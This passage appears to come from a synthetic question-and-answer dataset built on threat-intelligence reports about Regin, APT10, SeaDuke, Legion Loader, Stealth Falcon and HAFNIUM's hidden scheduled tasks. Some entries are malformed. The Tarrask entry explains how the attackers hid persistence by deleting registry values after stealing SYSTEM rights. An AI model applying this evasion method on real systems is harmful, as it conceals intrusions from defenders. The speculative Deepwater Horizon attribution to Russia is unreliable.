could learn which servers to target in order to disrupt communication.\nIt's unclear who is behind the attacks, however. In some cases, the locations of botnet controllers can be traced, but it's impossible to know whether an attacker is working on the behalf of another organization or government. \"It's going to take a year to figure this out,\" Nazario said.\nThe data trail often goes cold when it crosses borders because there is little legal framework for such investigations. And many countries, along with the United Nations and other international bodies, are still weighing whether a cyber attack is an act of war.\n\"If a state brings down the Internet intentionally, another state could very well consider that a hostile act,\" said Jonathan Zittrain, co-founder of Harvard's Berkman Center for Internet Society, and a principal investigator for the OpenNet Initiative.\nThere are also strategic reasons not to disrupt networks in order to monitor the enemy's conversations or to spread misinformation.\n\"That's an amazing intelligence opportunity,\" he said.\nUsing the Internet to control information can be more important than disrupting the networks when it comes to military strategy, Rohozinski said. In Georgia, for example, the lack of access to both Georgian and Russian sources of information kept citizens in the dark while the fighting continued.\n\"Sometimes the objective is not to knock out the infrastructure but to undermine the will of the people you're fighting against,\" he said. \"It's about the nuts and bolts, but it's also about how perceptions can be shaped through what's available and what's not.\"\n\nQ: What role did 'denial of service' attacks play in the cyber offensive against Georgia, and how did they impact the country's communication systems?",
    "output": "A: 'Denial of service' attacks, in which hundreds of computers in a network, or 'botnets,' simultaneously bombard a website with millions of requests, overwhelmed and crashed key Georgian servers. These attacks were strong enough to knock key sources of news and information offline for days.

This underscores the strategic importance of maintaining communication systems during conflicts.",

    "instruction": "Context: Big Headline: An Incident of Note\nOne incident which appears on the list is singular in that unlike the other noted events it does not appear to be the result of a direct cyber-attack: the Deepwater Horizon oil spill. On April 20th , the culmination of severe neglect of safety protocols and a slew of design and implementation flaws incurred the worst environmental disaster in US history. 54 While drilling the Macondo well in the Gulf of Mexico, the Deepwater Horizon oil rig had a \"blowout\" in which an uncontrolled mixture of mud and gas was released after failure of pressure control systems. The gas spread across the rig and is believed to have first ignited in the engine room, initiating several explosions and causing the rig to eventually be engulfed in flames and sink.55 The reason the \"Deepwater Horizon\" event appears on a list of \"cyber-related oil industry events\" is because, regardless of the cause, the incident had several failures in networked control and safety systems which could have prevented the catastrophe from occurring after the blowout.\nThe former chief electronics technician on the rig, Michael Williams, noted during testimony before a government panel that the alarms which would notify the crew of a gas situation was placed in an \"inhibited\" mode for over a year because \"they did not want people woke up at 3 o'clock in the morning due to false alarms [sic].\"56 Additionally, other monitoring and control systems intermittently froze, and a fire and alarm system was set to \"override active.\" Despite a series of four tests conducted in the hours before the incident to ascertain that the integrity of the well, no alarms were sounded or reported directly before the incident. These control issues solidify the idea that there was a cyber-component to the catastrophe. When taken into the context of other events which occur in and around the same time period, it becomes clear that though there is no direct evidence pointing to a malign threat actor's involvement, such an attack is technically viable.\nIt is incredibly unlikely that any state or non-state actor was involved in an attack on the Deepwater Horizon; however the circumstances preclude the exclusion of this possibility, remote though it may be. The Blowout Preventer (BOP) was recovered and forensically examined, but most other evidence cannot be examined \u2013 it has either ceased to exist or is inaccessible. The destructive nature of the accident and the apparent corporate neglect makes collecting any cyber-forensic evidence linking the incident to an actor infeasible. Most evidence is destroyed, unusable, or largely inaccessible at the bottom of the ocean. It is likely that any control system audit reports or logs capable of providing insight either would not have attributed anomalous activity to an unidentified APT, or would not be comprehensive enough to provide evidence that could retroactively suggest an APT. The audit logs themselves are dubious due to allegations that Transocean and BP were hastily rushing procedures because of large scheduling overruns.57 Further allegations have surfaced against BP employees and contractors accusing them of destroying evidence in the wake of the disaster.58 Bearing in mind that there is no direct or forensically sound evidence and that only circumstantial evidence is available, the vignette which will now be explored is the use case of the Deepwater Horizon incident as a cyber-attack.\nSeveral events that have occurred both before and since the BP oil spill suggest that an attack would be technically feasible. According to an article attributed to Dorothy E. Denning, a professor of computer science at Georgetown University, in 1992 a disgruntled former employee of Chevron intentionally disabled alarm systems at Chevron's oil refineries for 10 hours by \"hacking into computers in New York and San Jos\u00e9, California.\"59 While this only affected on-shore refineries and is dated enough that technical controls may have improved since then, another attack in 2009 showed that control systems on off-shore rigs may be also disabled remotely. Mario Azar, a disgruntled contractor formerly working for Pacific Energy Resources, sabotaged an offshore oil rig \"computer system that PER used to communicate between its\noffices and its oil platforms. The computer system also served a 'leak detection' function for PER.\"60 The systems were disabled from May 8th until June 29th before it was noticed.61 And as recently as February 23rd 2013 an article in the Huston Chronicle stated that \"Malicious software unintentionally downloaded by offshore oil workers has incapacitated computer networks on some rigs and platforms, exposing gaps in security that could pose serious risks to people and the environment.\"62\n54 (David Barstow, 2010)\n55 (How the Rig Crew Responded to the Blowout, 2010)\n56 (Investigation of Deepwarer Horizon Explosion, Mike Williams, 2010)\n57 (Drilling, 2011)\n58 (Affairs, 2012)\n59 (Denning, 2000)\nThese articles would seem to state that a cyber-attack on an off-shore rig is not only possible, but a reality. Complicated control system attacks such as Stuxnet have already proven that even in conditions where network access is unavailable, intelligent viruses can still perform a predetermined function at a designated time. By extension of these occurances, it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore, and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server.\nIf it is assumed that Deepwater Horizon was an attack, it gives rise to the question of attribution. In order to attribute an attack for which there is no direct or forensic evidence, one must instead turn to political attribution. This includes considering which actors had the motive, means, and the opportunity to perform the attack. Motives can in part be divined through observation of the direct and indirect outcomes of the event and its beneficiaries. After narrowing the scope of actors, one may then examine the policies, strategic culture, operations, and tactics of relevant actors against different dimensions of the event to reveal alignment or correlation.\nImmediate and direct impacts of the Deepwater Horizon oil spill were as follows:\n\uf0a7 A moratorium on any drilling in the Gulf of Mexico for the ensuing 6 months\n\uf0a7 The Macondo well becoming unusable, at least in the immediate\n\uf0a7 Ecological disaster in the United States and other GoM adjacent countries\n\uf0a7 Heavy political damage, fines, and charges levied against both BP and contractors such as Transocean, Ltd.\nBP has been by far the biggest figure attached to the incident. As of March 2013 BP has been forced to spend or provision $40 Billion as a result of Deepwater Horizon.63 To put this in perspective, BP's combined profits for the years of 2010-2012 amount to about $34.6 billion.64\nThese impacts in and of themselves are notable, but they also created a ripple effect of indirect consequences as well. These indirect outcomes include the possible fluctuation in oil and gas prices and potential for geopolitical fallout from the ecological disaster. Additionally though, and perhaps most significantly, in 2011 BP announced a $38 billion asset divestment program in order to cover the costs of the enormous fines incurred by the Deepwater Horizon spill.65 So what did BP divest, and to whom?\n60 (Mrozek, 2009)\n61 (United States of America v. Mario Azar, 2009)\n62 (Shauk, 2013)\n63 (Williams, 2013)\n64 (BP, 2012, p. 34)\n65 (BP, Financial and Operating Information 2007-2011, 2011, p. 3)\nThis data would suggest that one of the main beneficiaries of the oil spill is Rosneft, a state-owned oil company belonging to a state actor which possesses both a cyber-capability and vested interest in the oil industry. It is the only one of the top five oil producing countries yet to be mentioned: the Russian Federation. In July of 2012 Forbes released an article on the World's largest oil companies. What was notable about the article was this quote: \"But when sorting through the rankings of the World's 25 Biggest Oil Companies and looking at who controls and influences the biggest of big oil one thing becomes clear: no industry leader has more sway, has twisted more arms or made more deals than Russian President Vladimir Putin.\" The article goes on to point out the Russian President's past use of Gazprom\u2014the state-run oil giant and second largest producer in the world\u2014as a political tool and his vast influence over other non-Russian oil companies. Russia, an acknowledged force in cyber and the second largest exporter of oil in the world, is markedly absent in the last decade from the master timeline either as an aggressor or as a target, barring of a few leaked emails by the Anonymous hacking group. This appears aberrant, even despite the possible language barrier mentioned at the beginning of this report or Russia's tightly controlled dissemination of information.\nWhile clearly the Russian Federation was the largest beneficiary of BP's post-spill divestments and also benefited from a halt in Gulf of Mexico oil production, the question that remains is whether or not the possible acquisition of TNKBP (which would be difficult to predict) is motivation enough to engage in a risky enterprise such as a cyber-attack that results in a kinetic outcome\u2014particularly when weighed against the possibility of direct attribution that could have far reaching implications to relations with both the UK and the US. If these benefits alone are not enough, then what other motivators existed which, in concert, would have been cause for Russia to launch a cyber-attack on a UK company operating in the Gulf of Mexico? In order to properly answer these questions many factors need to be examined, including:\n\uf0a7 the extent of BP-Russian relations leading up to and beyond the Deepwater Horizon incident\n\uf0a7 Geopolitical considerations of the time\n\nQuestion: Given the lack of direct or forensic evidence, what methods can be used to attribute a potential cyber-attack on the Deepwater Horizon, and what factors should be considered in this process?\n\nAnswer:",
    "output": "Attribution in the absence of direct evidence involves political attribution, which considers motive, means, and opportunity. This includes examining the direct and indirect outcomes of the event and identifying beneficiaries. Factors to consider include the moratorium on drilling, ecological disaster, political damage, and financial losses. For instance, BP's asset divestment program to cover fines and the beneficiaries of these divestments, such as Rosneft, could be analyzed. Additionally, the policies, strategic culture, operations, and tactics of potential actors should be examined to find alignment or correlation with the event.",

Stealth Falcon's Widespread Targeting of UAE Figures\nThis section describes how we identified additional Stealth Falcon victims and bait content, and traced Stealth Falcon's spyware to additional C2 servers.\nGiven Stealh Falcon's use of public Twitter mentions to contact individuals, we searched Google and Twitter for instances of aax.me links. The links we found indicated that we could easily probe aax.me to get a comprehensive list of all currently active short URLs, and their corresponding long URLs. Our findings point to a UAE-focused operator, whose bait content and targets are linked to the Emirates. Furthermore, we were able to connect this attack to case from December 2012, where an anonymous UAE activist contacted us and claimed to have received a suspicious link from a Twitter account that was purportedly under government control.\nMedium Headline: 5.1. Public Targets and Links to Arrests\nThis section describes 24 Stealth Falcon Twitter targets we identified on the basis of them receiving an aax.me link in a Twitter mention.\nWe found aax.me links targeting 24 accounts, each of whom was mentioned in a tweet that also contained an aax.me shortened link. We were unable to get details about 17 of the accounts. Of the accounts we have been able to identify, several individuals were subsequently arrested or convicted in absentia by the UAE Government in relation to their online activities.\nThe following table outlines these cases, and notes arrests. For completeness, the table includes the cases from Section 4.14.3:\nWe list additional details in Appendix D: Public Stealth Falcon Tweets.\nMedium Headline: 5.2. Ennumerating aax.me for Bait Content\nThis section describes how we probed every conceivable short URL on aax.me, and found 402 pieces of bait content that we believe were sent by Stealth Falcon.\nAll of the public aax.me links we found, as well as the links sent to Donaghy, matched the regular expression /aax\\.me\\/[0-9af]{5}/. Assuming all links shortened via aax.me match this regular expression, there are only 165 (1,048,576) possible short URLs. We sent a request to aax.me for each possible URL, and observed the returned page or redirect. We found 57 URLs that exhibited the redirect.php profiling behavior, and 524 URLs that returned an HTTP 302 redirect to an expanded URL. The other 1,047,995 aax.me links returned a HTTP 302 redirect to the aax.me homepage; we assume these short URLs were unassigned to an expanded URL, as of the time of our scan.\nWe coded the long URLs where the URLs were still active, or where we could find an archived copy of, or some information about, the URL. We were able to code 535 URLs, and failed to code 46 URLs as the corresponding websites were down, and we could not find reliable information about what content the URLs contained. See Appendix E: Results of aax.me Scan for details. We coded 133 URLs as \"advertisement\" (25% of all coded URLs), as they appeared to represent an advertisement for a product. The vast majority of these advertisements seemed to be products typically marketed via spam (e.g., \"dietary supplement\" or \"green coffee\"). We suspect that these links may have been shortened by spammers, as the aax.me URL shortening page is pubilcly accessible and indexed by Google, and YOURLS advises that publicly accessible URL shorteners will receive spam. 83 All \"advertisement\" links were 302 redirects, and none were redirect.php links. This is consistent with our observation that the aax.me public interface only permits visitors to shorten links using the 302 redirect method.\nWe filtered out the short URLs classified as \"advertisement.\" There were 402 non-advertisement short URLs that we tagged. We display a summary of the top ten tags below:\nWe noted that a number of long URLs had multiple corresponding short URLs. We display the top ten long URLs below.\n\nBased on the above text, answer a question.

Although he couldn't share a sample, the researcher mentioned 'Regin', a type of malware attack that is now dreaded by security administrators in many government agencies around the world.\nFor the past three years we have been tracking this most elusive malware all around the world. From time to time samples would appear on various multi-scanner services, but they were all unrelated to each other, cryptic in functionality, and lacking in context.\nIt is unknown exactly when the first samples of Regin appeared in the wild. Some of them have timestamps dating back to 2003.\nThe victims of Regin fall into the following categories:\n\u2022 Telecom operators\n\u2022 Government institutions\n\u2022 Multinational political bodies\n\u2022 Financial institutions\n\u2022 Research institutions\n\u2022 Individuals involved in advanced mathematical/cryptographic research\nSo far, we've observed two main objectives of the attackers:\n\u2022 Intelligence gathering\n\u2022 Facilitating other types of attacks\nWhile in most cases the attackers were focused on extracting sensitive information such as emails and other electronic documents, we have observed cases where the attackers compromised telecom operators to enable the launch of additional sophisticated attacks. This is discussed in detail in the GSM attacks section, below.\nPerhaps one of the most well-known victims of Regin was Jean Jacques Quisquater (), a well-known Belgian cryptographer. In February 2014, Quisquater announced he was the victim of a sophisticated cyber-intrusion incident. We were able to obtain samples from the Quisquater case and confirm they belong to the Regin platform.\nAnother victim of Regin was a computer we call the 'Magnet of Threats'. The computer belongs to a certain research institution and, besides Regin, it has been attacked by Animal Farm, Itaduke, Mask/Careto, Turla, and some other advanced threats that do not have public names, all co-existing happily on the same computer at some point.\n\nAnswer this question based on the above context: How did the Regin malware evolve over time, and what challenges did its evolution pose to security researchers?",
    "output": "The Regin malware evolved over an extended period, with some samples having timestamps dating back to 2003. Its evolution posed significant challenges to security researchers due to its elusive nature. Samples of Regin would occasionally appear on various multi-scanner services, but these samples were often unrelated to each other, had cryptic functionalities, and lacked context. This made it difficult for researchers to fully understand the scope and capabilities of the malware.",

    "instruction": "Answer based on context:\n\nBig Headline: Right on schedule: Maintaining persistence via scheduled tasks\nWindows Task Scheduler is a service that allows users to perform automated tasks (scheduled tasks) on a chosen computer for legitimate administrative purposes (e.g., scheduled updates for browsers and other applications).\nThroughout the course of our research, we've found that threat actors commonly make use of this service to maintain persistence within a Windows environment.\nWe've noted that the Tarrask malware generates several artifacts upon the creation of a scheduled task, whether using the Task Scheduler GUI or the  command line utility. Profiling the use of either of these tools can aid investigators in tracking this persistence mechanism.\nThe following registry keys are created upon creation of a new task:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\ {GUID}\nThe first subkey, created within the Tree path, matches the name of the scheduled task. The values created within it (Id, Index, and SD) contain metadata for task registration within the system. The second subkey, created within the Tasks path, is a GUID mapping to the Id value found in the Tree key. The values created within (Actions, Path, Triggers, etc.) contain the basic parameters necessary to facilitate execution of the task.\nTo demonstrate the value in the artifacts generated, shown in the following figures, we have created \"My Special Task\" which is set to execute the binary \"C:\\Windows\\System32\\calc.exe\" on a regular interval.\nSimilar information is also stored within an extensionless XML file created within C:\\Windows\\System32\\Tasks, where the name of the file matches the name of the task. This is displayed in Figure 2, where we name the task \"My Special Task\" as an example.\nNote that the \"Actions\" value stored within the Tasks\\{GUID} key points to the command line associated with the task. In Figure 2, there is a reference to \"C:\\Windows\\System32\\calc.exe\" within the \"Edit Binary Value\" dialog, and there is a path referenced within the \"<Command>\" section in the extensionless XML file in Figure 3. The fact that this value is stored within two different locations can prove useful in recovering information regarding the task's purpose in the event the threat actor has taken steps to cover their tracks.\nFinally, there are two Windows event logs that record actions related to the creation and operation of Scheduled Tasks \u2013 Event ID 4698 within the Security.evtx log, and the Microsoft-Windows-TaskScheduler/Operational.evtx log.\nNeither of these are audited by default and must be explicitly turned on by an administrator. Microsoft-Windows-TaskScheduler/Maintenance.evtx will exist by default, but only contains maintenance-related information for the Task Scheduler engine.\nBig Headline: Effectively hiding scheduled tasks\nIn this scenario, the threat actor created a scheduled task named \"WinUpdate\" via HackTool:Win64/Tarrask in order to re-establish any dropped connections to their command and control (C&C) infrastructure. This resulted in the creation of the registry keys and values described in the earlier section, however, the threat actor deleted the SD value within the Tree registry path.\nIn this context, SD refers to the Security Descriptor, which determines the users allowed to run the task. Interestingly, removal of this value results in the task \"disappearing\" from \"schtasks /query\" and Task Scheduler. The task is effectively hidden unless an examiner manually inspects the aforementioned registry paths.\nIssuing a \"reg delete\" command to delete the SD value will result in an \"Access Denied\" error even when run from an elevated command prompt. Deletion must occur within the context of the SYSTEM user. It is for this reason that the Tarrask malware utilized token theft to obtain the security permissions associated with the lsass.exe process. Upon execution of the token theft, the malware could operate with the same privileges as LSASS, making the deletion possible.\nIt is also important to note that the threat actor could have chosen to completely remove the two registry keys within Tree and Tasks, and the XML file created within C:\\Windows\\System32\\Tasks. This would effectively remove the on-disk artifacts associated with the scheduled task, but the task would continue to run according to the defined triggers until the system rebooted, or until the associated svchost.exe process responsible for executing the task was terminated.\nIt's possible the threat actor wanted to ensure persistence across reboots and therefore chose not to perform those steps, instead deleting only the SD value; however, we also speculate that the threat actor was unaware that the task would continue to run even after these components were removed.\nBig Headline: Recommendations and cyber resilience guidance\nJob or task schedulers are services that have been present in the Windows operating system for many years. The attacks we described signify how the threat actor HAFNIUM displays a unique understanding of the Windows subsystem and uses this expertise to mask activities on targeted endpoints to maintain persistence on affected systems and hide in plain\nsight.\nAs such, we recognize that scheduled tasks are an effective tool for adversaries to automate certain tasks while achieving persistence, which brings us to raising awareness about this oft-overlooked technique. We also want to bring attention to the fact that threat actors may utilize this method of evasion to maintain access to high value targets in a manner that will likely remain undetected. This could be especially problematic for systems that are infrequently rebooted (e.g., critical systems such as domain controllers, database servers, etc.).\nThe techniques used by the actor and described in this post can be mitigated or detected by adopting the following recommendations and security guidelines1:\nEnumerate your Windows environment registry hives looking in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree registry hive and identify any scheduled tasks without SD (security descriptor) Value within the Task Key. Perform analysis on these tasks as needed.\nModify your audit policy to identify Scheduled Tasks actions by enabling logging \"TaskOperational\" within Microsoft-Windows-TaskScheduler/Operational. Apply the (<https://docs.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations>)recommended Microsoft audit policy settings suitable to your environment.\nEnable and centralize the following Task Scheduler logs. Even if the tasks are 'hidden', these logs track key events relating to them that could lead you to discovering a well-hidden persistence mechanism\nEvent ID 4698 within the Security.evtx log\nMicrosoft-Windows-TaskScheduler/Operational.evtx log\nThe threat actors in this campaign used hidden scheduled tasks to maintain access to critical assets exposed to the internet by regularly re-establishing outbound communications with C&C infrastructure. Remain vigilant and monitor uncommon behavior of your outbound communications by ensuring that monitoring and alerting for these connections from these critical  is in place.\nBig Headline: Microsoft Sentinel Detections\nMicrosoft Sentinel customers can use the following detection queries to look for this activity:\n: This query identifies a hash match related to Tarrask malware across various data sources.\n: This query uses Windows Security Events to detect attempts by malware to hide the scheduled task by deleting the SD (Security Descriptor) value. Removal of SD value results in the scheduled task \"disappearing\" from \"schtasks /query\" and Task Scheduler.\n: This query looks for Microsoft Defender AV detections related to Tarrask malware using SecurityAlerts table. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, IP, logged on users etc. This way, the Microsoft Sentinel user can have all the pertinent device info in one view for the alerts.\n1 The technical information contained in this article is provided for general informational and educational purposes only and is not a substitute for professional advice.

We do not provide any kind of guarantee of a certain outcome or result based on the information provided. Therefore, the use or reliance of any information contained in this article is solely at your own risk.\n\nWhat are the implications of removing the SD value from the Tree registry path, and why might the threat actor choose not to completely remove the registry keys and XML file associated with the scheduled task?",
    "output": "Removing the SD value from the Tree registry path hides the scheduled task from traditional means of identification, but the task continues to run according to its defined triggers until the system reboots or the associated svchost.exe process is terminated. The threat actor might choose not to completely remove the registry keys and XML file to ensure persistence across reboots. Additionally, the threat actor might be unaware that the task would continue to run even after these components are removed.",

    "instruction": "Untangling Legion Loader's Hornet Nest of Malware\nDecember 18, 2019\nMalware often arrives hand in hand with other malware. Emotet, for example, can deliver TrickBot; and TrickBot (which is also in a collaborative relationship with IcedID, a fellow banking malware) can, in turn, deliver Ryuk. This kind of collaborative relationship is becoming among many threat actors, and in some cases even leads to actors developing specific modules in order to serve these relationships.\nIn a recent incident at a customer environment, Deep Instinct prevented a malicious dropper from infecting the customer's environment. Analysis of the dropper and the campaign it is associated with, revealed it involves multiple types of malware. The quantity and variety of which, earned its reference as a \"Hornet's Nest\".\nIncluded in this campaign is a grab-bag mix of multiple types of info-stealers, backdoors, a file-less crypto-currency stealer built into the dropper, and occasionally a crypto-miner as well. Such volume and variety are uncommon in the general landscape and are highly suggestive of a dropper-for-hire campaign.\nCaption: The hornet's nest buried within Legion Loader\n\nAnswer this question based on the above context: Why might the presence of multiple types of malware in a single campaign, as seen with Legion Loader, be indicative of a 'dropper-for-hire' operation? Explain how this strategy benefits threat actors and what implications it has for cybersecurity defenses.",
    "output": "The presence of multiple types of malware in a single campaign, such as the one involving Legion Loader, suggests a 'dropper-for-hire' operation because it indicates that the dropper is designed to deliver various payloads depending on the needs of different clients. This strategy benefits threat actors by allowing them to offer a versatile service that can cater to a wide range of malicious activities, from information theft to cryptocurrency mining. For cybersecurity defenses, this implies that detecting and preventing the initial dropper is crucial, as it can lead to a cascade of different threats. Moreover, defenders must be prepared to handle a diverse array of potential malware types, requiring a multi-layered defense approach that includes robust endpoint protection, network monitoring, and advanced threat detection capabilities.",

    "instruction": "Big Headline: Foreword\nThis report is an initial public release of research PwC UK and BAE Systems have conducted into new, sustained global campaigns by an established threat actor against managed IT service providers and their clients as well as several directly targeted organisations in Japan. Given the scale of those campaigns, the activity identified here is likely to reflect just a small portion of the threat actor's operations.\nThis report is primarily fact-based. Where we have made an assessment this has been made clear by phraseology such as \"we assess\", and the use of estimative language as outlined in Appendix A.\nBy publicly releasing this research, PwC UK and BAE Systems hope to facilitate broad awareness of the attack techniques used so that prevention and detection capabilities can be configured accordingly. It is also hoped that rapid progress can be made within the broader security community to further develop the understanding of the campaign techniques we outline, leading to additional public reports from peers across the security community.\nAs a part of our research and reporting effort, PwC UK and BAE Systems have collaborated with the UK's National Cyber Security Centre (NCSC) under its Certified Incident Response (CIR) scheme to engage and notify managed IT service providers, known affected organisations and other national bodies.\nSupplementary to this report, an Annex containing our technical analysis will be released.\nMedium Headline: APT10 has significantly increased its scale and capability since early 2016, including the addition of new custom tools.\n\u2022 APT10 ceased its use of the Poison Ivy malware family after a 2013 FireEye report, which comprehensively detailed the malware's functionality and features, and its use by several China-based threat actors, including APT10.\n\u2022 APT10 primarily used PlugX malware from 2014 to 2016, progressively improving and deploying newer versions, while simultaneously standardising their command and control function.\n\u2022 We have observed a shift towards the use of bespoke malware as well as open-source tools, which have been customised to improve their functionality. This is highly likely to be indicative of an increase in sophistication.\nMedium Headline: Infrastructure observed in APT10's most recent campaigns links to previous activities undertaken by the threat actor.\n\u2022 The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic-DNS domains, which are highly interconnected and link to the threat actor's previous operations. The number of dynamic-DNS domains in use by the threat actor has significantly increased since 2016, representative of an increase in operational tempo.\n\u2022 Some top level domains used in the direct targeting of Japanese entities share common IP address space with the network of dynamic-DNS domains that we associate with Operation Cloud Hopper.\nMedium Headline: PwC UK and BAE Systems assess APT10 as highly likely to be a China-based threat actor.\n\u2022 It is a widely held view within the cyber security community that APT10 is a China-based threat actor.\n\u2022 Our analysis of the compile times of malware binaries, the registration times of domains attributed to APT10, and the majority of its intrusion activity indicates a pattern of work in line with China Standard Time (UTC+8).\n\u2022 The threat actor's targeting of diplomatic and political organisations in response to geopolitical tensions, as well as the targeting of specific commercial enterprises, is closely aligned with strategic Chinese interests.\nMedium Headline: APT10 as a China-based threat actor\nPwC UK and BAE Systems assess it is highly likely that APT10 is a China-based threat actor with a focus on espionage and wide ranging information collection. It has been in operation since at least 2009, and has evolved its targeting from an early focus on the US defence industrial base (DIB)1 and the technology and telecommunications sector, to a widespread compromise of multiple industries and sectors across the globe, most recently with a focus on MSPs.\nAPT10, a name originally coined by FireEye, is also referred to as Red Apollo by PwC UK, CVNX by BAE Systems, Stone Panda by CrowdStrike, and menuPass Team more broadly in the public domain. The threat actor has previously been the subject of a range of open source reporting, including most notably a report by FireEye comprehensively detailing the threat actor's use of the Poison Ivy malware family2 and blog posts by Trend Micro3 similarly detailing the use of EvilGrab malware.\nAlongside the research and ongoing tracking of APT10 by both PwC UK and BAE's Threat Intelligence teams, PwC UK's Incident Response team has been engaged in supporting investigations linked to APT10 compromises. This research has contributed to the assessments and conclusions we have drawn regarding the recent campaign activity by APT10, which represents a shift from previous activities linked to the threat actor.\nAs a result of our analysis of APT10's activities, we believe that it almost certainly benefits from significant staffing and logistical resources, which have increased over the last three years, with a significant step-change in 2016. Due to the scale of the threat actor's operations throughout 2016 and 2017, we similarly assess it currently comprises multiple teams, each responsible for a different section of the day-to-day operations, namely domain registration, infrastructure management, malware development, target operations, and analysis.\nAPT10 withdrew from direct targeting using Poison Ivy in 2013 and conducted its first known retooling operation, upgrading its capabilities and replatforming to use PlugX. It is highly likely that this is due to the release of the 2013 FireEye report.\nOur report will detail the most recent campaigns conducted by APT10, including the sustained targeting of MSPs, which we have named Operation Cloud Hopper, and the targeting of a number of Japanese institutions.\n1 The defence industrial base comprises the US Department of Defense and a plethora of companies that support the design, development and maintenance of defence assets and enable US military requirements to be met. https://www.dhs.gov/defense-industrial-base-sector\n2 https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf\n3 http://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/\nMedium Headline: Time-based analysis of APT10's operations\nAs part of our analysis, we have made a number of observations about APT10 and its profile, which supports our assessment that APT10 is a China-based threat actor. For example, we have identified patterns within the domain registrations and file compilation times associated with APT10 activity. This is almost certainly indicative of a threat actor based in the UTC+8 time zone, which aligns to Chinese Standard Time (CST).\nShown in Figure 1 are registration times4, represented in UTC, for known APT10 top level domains since mid-2016, which mark a major uptick in APT10 activity.\nMapping this to UTC+8, as in Figure 2, shows a standard set of Chinese business hours, including a two-hour midday break.\nFigure 1: APT10 domain registration times in UTC\nFurther analysis of the compile times of PlugX, RedLeaves and Quasar malware samples used by APT10 reveals a similar pattern in working hours, as shown in Figure 3.\nShifting this to UTC+8 shows a similar timeframe of operation to the domain registrations. There are some outliers, which are likely attributable to the operational nature of this threat actor, such as requirements to work outside normal business hours.\nFigure 3: Compile times of PlugX, RedLeaves and Quasar in UTC\n4 The bubbles shown on Figures 1 through 6 are representative of the number of events observed at that time and date.\nWhen applying the time shift to the ChChes malware (newly used by APT10) compilation timestamps, we see a different pattern as shown in Figure 5. While this does not align with Chinese business hours, it is likely to be either a result of the threat actor changing its risk profile by attempting to obscure\nor confuse attribution or a developer's side project that has ended up being used on targeted operations. Based on other technical overlaps, ChChes is highly likely to be exclusively used by APT10.\nFigure 5: Compile time of ChChes in UTC\nTo further this analysis, we have observed the threat actor conducting interactive activities primarily between the hours of midnight and 10:00 UTC, as shown in Figure 7. When converting this to UTC+8 we again see a shift to Chinese business hours, with operations occurring between 08:00 and 19:00. It is a realistic probability that the weekend work observed in Figure 7 may be necessary as part of operational requirements.\nThe sum of this analysis aligns with the evidence provided by the United States Department of Justice indictment against several individuals associated with APT1,5 another China-based threat actor, showing a working day starting at 08:00 UTC+8 and finishing at 18:00 UTC+8 with a two hour lunch break from 12:00 UTC+8 until 14:00 UTC+8.\nFigure 7: Operational times of APT10 in UTC+8\n5 https://www.justice.gov/iso/opa/resources/5122014519132358461949.pdf\n\nBased on the above text, answer a question. What characteristics of APT10's command and control infrastructure suggest an increase in operational tempo, and how does this relate to previous activities?",
    "output": "The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic-DNS domains, which are highly interconnected and link to the threat actor's previous operations. The significant increase in the number of dynamic-DNS domains in use by APT10 since 2016 indicates an increase in operational tempo. Additionally, some top-level domains used in the direct targeting of Japanese entities share common IP address space with the network of dynamic-DNS domains associated with Operation Cloud Hopper.",

    "instruction": "Context: Medium Headline: SeaDuke/ SeaDaddy/ SeaDask\nSeaDuke appeared in October 2014, after the disclosure of most of the Duke campaigns. Like the majority of the Duke family, SeaDuke exclusively targets government organizations. The main difference between Seaduke and its sister campaigns is that SeaDuke focuses on a small number of high-value targets. Additionally, of the Duke malware, SeaDuke alone is\nprogrammed in python. This developers' choice could indicate that the group is expanding their victim pool to Linux systems as well as Windows hosts. The overall framework of the malware remains similar to CozyDuke.\nSeaDuke is a highly configurable trojan and backdoor that is often installed onto victim systems through CozyDuke or via a compromised website. It has hundreds of possible configurations. According to Symantec, the threat actor behind CozyDuke may only deploy SeaDuke in systems belonging to \"major government-level targets.\" SeaDuke primarily allows the attacker to upload, to download, and to delete files on the victim machine as well as to retrieve bot/ system information and to update the bot configuration. It is possible that the threat actor deploys the malware to remove the indicators of compromise from other campaigns after a successful breach. The trojan may also be used to conduct pass the ticket attacks on Kerberos systems, to steal emails from Microsoft Exchange servers using compromised credentials, to archive sensitive data, or to exfiltrate data through legitimate cloud services. The C&C infrastructure behind SeaDuke relies on over 200 compromised web servers and several layers of RC4 and AES encryption and Base 64 encoding techniques. These extra obfuscation measures may be an attempt to remain undiscovered and thereby remove the attention on the Duke campaigns. SeaDuke communicates with its C&C servers via HTTP(s).\nAnswer this question: Why might the developers of SeaDuke have chosen to program the malware in Python, and how does this choice potentially expand their target pool?",
    "output": "The developers of SeaDuke chose to program the malware in Python, which is a departure from the typical programming languages used in the Duke family of malware. This choice could indicate that the group is expanding their victim pool to include Linux systems in addition to Windows hosts. Python is a versatile language that runs on multiple operating systems, making it easier for the malware to be deployed across different environments. By targeting both Windows and Linux systems, SeaDuke can potentially compromise a wider range of high-value targets, increasing the effectiveness of their campaigns.",

